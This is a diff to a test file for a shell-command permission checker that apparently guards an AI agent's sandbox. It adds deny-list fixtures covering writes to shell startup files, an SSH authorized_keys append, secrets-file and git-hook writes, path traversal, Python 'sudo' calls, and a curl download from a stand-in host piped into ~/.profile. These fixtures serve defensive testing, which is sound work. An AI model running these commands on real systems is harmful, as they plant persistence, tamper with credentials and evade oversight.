@@ -1419,6 +1419,12 @@ WRITE_DENY = [
     "echo k >> ../../.ssh/authorized_keys",
     "echo evil >> ~/.zshrc",
     "echo evil > ~/.bashrc",
+    # zsh reads `.zshenv` for every `zsh -c`, and a login or logout runs the rest (#1275)
+    "echo 'export X=1' >> ~/.zshenv",
+    "echo evil >> ~/.zlogin",
+    "echo evil | tee -a ~/.zlogout",
+    "echo evil > ~/.bash_login",
+    "sed -i '$ a evil' ~/.bash_logout",
     "curl -s http://x | tee ~/.profile",
     "tee secrets/secrets.yml",
     "echo x > secrets/secrets.yml",
@@ -1514,10 +1520,14 @@ WRITE_ALLOW = [
 
 def test_writing_a_secret_or_startup_file_is_denied():
     assert kinds(WRITE_DENY) == ["deny"] * len(WRITE_DENY)
-    assert rules(["echo evil >> ~/.zshrc", "sed -i s/a/b/ secrets/secrets.yml"]) == [
-        "write-target",
-        "inplace-edit",
-    ]
+    assert rules(
+        [
+            "echo evil >> ~/.zshrc",
+            "echo 'export X=1' >> ~/.zshenv",
+            "sed -i s/a/b/ secrets/secrets.yml",
+            "sed -i '$ a evil' ~/.bash_logout",
+        ]
+    ) == ["write-target", "write-target", "inplace-edit", "inplace-edit"]
 
 
 def test_writing_an_ordinary_file_is_allowed():
@@ -1543,6 +1553,7 @@ SCRATCH_FIXTURE_DENY = [
     "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/../../../server/secrets/secrets.yml",
     f"printf k > {HOME}/.claude/jobs/x/tmp/../../../../server/secrets.yml",
     "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/x/.bashrc",
+    "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/x/.zshenv",
     "printf 'k\\n' > $CLAUDE_JOB_DIR/tmp/.git/hooks/pre-push",
     "cp x $CLAUDE_JOB_DIR/tmp/.git/config",
     # a second write beside the fixture, another variable, or a reassigned job dir
@@ -1579,6 +1590,7 @@ PYTHON_WRITE_DENY = [
     # the path is an argument after the program
     "python3 -c \"import sys; open(sys.argv[1], 'a').write('x')\" ~/.zshrc",
     "python3 - ~/.zshrc <<'EOF'\nimport sys\nopen(sys.argv[1], 'a').write('x')\nEOF",
+    "python3 -c \"import sys; open(sys.argv[1], 'a').write('x')\" ~/.zshenv",
     # a path-spelled interpreter, and a leader in front of it
     f"/usr/bin/python3 -c \"open('{BASHRC}','w')\"",
     f"env PYTHONPATH=. python3 -c \"open('{BASHRC}','w')\"",
@@ -2471,7 +2483,7 @@ SUDO_REFUSE = [
     "python3 - <<'EOF'\nimport pathlib\npathlib.os.system('sudo id')\nEOF",
     "python3 - <<'EOF'\nimport yaml\nyaml.unsafe_load('x: sudo')\nEOF",
     "python3 -c \"getattr(__import__('os'), 'system')('sudo id')\"",
-    "python3 - <<'EOF'\nfrom pathlib import Path\nPath('/u/.zshenv').write_text('sudo id')\nEOF",
+    "python3 - <<'EOF'\nfrom pathlib import Path\nPath('/u/.local/bin/g').write_text('sudo id')\nEOF",
     # an unquoted delimiter: the shell runs the substitution before Python reads a word
     "python3 - <<EOF\nprint('$(sudo id)')\nEOF",
     # a script reads the heredoc as data, and may run it
